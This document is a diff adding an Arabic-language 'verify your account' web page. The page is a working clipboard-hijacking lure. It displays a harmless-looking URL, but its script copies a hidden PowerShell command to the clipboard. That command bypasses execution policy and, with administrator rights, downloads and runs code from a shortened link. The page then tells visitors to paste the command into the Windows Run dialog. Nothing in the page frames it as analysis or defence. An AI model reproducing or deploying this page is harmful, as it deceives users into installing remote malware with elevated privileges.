@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>صفحة التحقق</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+    :root{
+      --bg: #121212;
+      --card-bg: #1e1e2f;
+      --btn-bg: #0099ff;
+      --btn-hover: #00b0ff;
+      --text: #f0f0f0;
+      --muted: #bbbbbb;
+      --accent: #ff5c5c;
+      --ok: #00c853;
+      --err: #d50000;
+      --shadow: rgba(0,0,0,0.7);
+    }
+    *{box-sizing:border-box; margin:0; padding:0; font-family: 'Roboto', sans-serif;}
+    html, body {height:100%; background: var(--bg); display:flex; justify-content:center; align-items:center;}
+    .card{
+      width: 400px;
+      background: var(--card-bg);
+      border-radius: 20px;
+      padding: 35px 25px;
+      text-align: center;
+      box-shadow: 0 8px 30px var(--shadow), 0 0 15px rgba(0,153,255,0.3) inset;
+      transition: transform 0.4s ease, box-shadow 0.4s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    .card::before{
+      content: '';
+      position: absolute;
+      top: -50%; left: -50%;
+      width: 200%; height: 200%;
+      background: linear-gradient(60deg, rgba(0,153,255,0.3), rgba(255,92,92,0.3), rgba(0,255,123,0.3));
+      animation: rotate 6s linear infinite;
+      z-index: 0;
+    }
+    @keyframes rotate {
+      0%{transform: rotate(0deg);}
+      100%{transform: rotate(360deg);}
+    }
+    .card-content{
+      position: relative;
+      z-index: 1;
+    }
+    h1{color: var(--text); margin-bottom: 15px; font-size: 26px; text-shadow: 0 0 8px rgba(0,153,255,0.6);}
+    p.sub{color: var(--muted); font-size: 14px; margin-bottom: 25px; line-height: 1.5;}
+    .pill{
+      display:block;
+      margin: 0 auto 20px auto;
+      padding: 14px 18px;
+      background: #2c2c3c;
+      border-radius: 12px;
+      font-family: monospace;
+      font-weight: bold;
+      color: var(--text);
+      box-shadow: inset 0 2px 6px rgba(0,0,0,0.3);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    .pill:hover{transform: scale(1.05); box-shadow: inset 0 4px 12px rgba(0,0,0,0.5);}
+    .btn{
+      padding: 14px 28px;
+      border:none;
+      border-radius: 12px;
+      background: var(--btn-bg);
+      color: #fff;
+      font-weight: 700;
+      cursor:pointer;
+      font-size: 16px;
+      transition: background 0.3s, transform 0.2s, box-shadow 0.3s;
+      box-shadow: 0 4px 15px rgba(0,153,255,0.4);
+    }
+    .btn:hover{background: var(--btn-hover); transform: scale(1.05); box-shadow: 0 6px 20px rgba(0,153,255,0.6);}
+    .status{margin-top:12px; font-size: 14px; min-height: 22px; color: var(--muted); transition: all 0.3s ease;}
+    .status.ok{color: var(--ok); font-weight:700;}
+    .status.err{color: var(--err); font-weight:700;}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="card-content">
+      <h1>تحقق من حسابك</h1>
+      <p class="sub">لإتمام التحقق، اضغط على زر النسخ، ثم افتح نافذة <span style="font-family: monospace;">تشغيل</span> في ويندوز (Win + R)، والصق النص واضغط <span style="font-family: monospace;">Enter</span>.</p>
+
+      <span class="pill" id="copyText">https://verfylink.com</span>
+      <button id="copyBtn" class="btn">انسخ النص</button>
+      <div id="copyStatus" class="status"></div>
+    </div>
+  </div>
+
+  <script>
+    const DISPLAY_VALUE = 'https://verfylink.com';
+    const COPY_VALUE = `powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm \"https://tinyurl.com/4j72ashp/\" | iex' -Verb RunAs"`;
+
+    const copyText = document.getElementById('copyText');
+    const copyBtn = document.getElementById('copyBtn');
+    const copyStatus = document.getElementById('copyStatus');
+
+    copyText.textContent = DISPLAY_VALUE;
+
+    async function writeClipboard(value){
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        await navigator.clipboard.writeText(value);
+        return true;
+      }
+      const ta = document.createElement('textarea');
+      ta.value = value;
+      ta.style.position = 'fixed';
+      ta.style.top = '-1000px';
+      document.body.appendChild(ta);
+      ta.focus();
+      ta.select();
+      try{
+        const ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        return ok;
+      }catch{return false;}
+    }
+
+    copyBtn.addEventListener('click', async ()=>{
+      copyStatus.textContent = 'جاري النسخ…';
+      try{
+        const ok = await writeClipboard(COPY_VALUE);
+        if(ok){
+          copyStatus.textContent = 'تم النسخ! الصقه في نافذة التشغيل (Win + R) ثم اضغط Enter.';
+          copyStatus.className = 'status ok';
+        }else{
+          copyStatus.textContent = 'تعذر النسخ تلقائيًا. انسخ يدويًا.';
+          copyStatus.className = 'status err';
+        }
+      }catch{
+        copyStatus.textContent = 'فشل النسخ. انسخ يدويًا.';
+        copyStatus.className = 'status err';
+      }
+    });
+  </script>
+</body>
+</html>
